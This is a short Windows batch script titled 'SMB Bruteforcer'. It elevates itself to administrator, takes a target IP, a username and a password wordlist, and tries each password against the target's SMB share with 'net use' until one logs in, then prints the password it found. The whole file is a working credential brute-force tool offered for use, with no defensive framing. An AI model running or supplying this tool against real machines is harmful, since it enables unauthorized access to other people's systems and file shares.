@echo off
fltmc >nul 2>&1 || (
    PowerShell Start -Verb RunAs '%0' 2> nul || (
        >nul pause && exit 1
    )
    exit 0
)
cd /d "%~dp0"
title SMB Bruteforcer - by Schooi
if exist logo.bat call logo.bat & echo.
echo SMB Bruteforcer
echo.
set /p ip=Console ^| Enter IP Address: 
set /p user=Console ^| Enter Username: 
set /p wordlist=Console ^| Enter Password List: 

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Success! ^| Password Found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo ATTEMPT %count% ^| [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success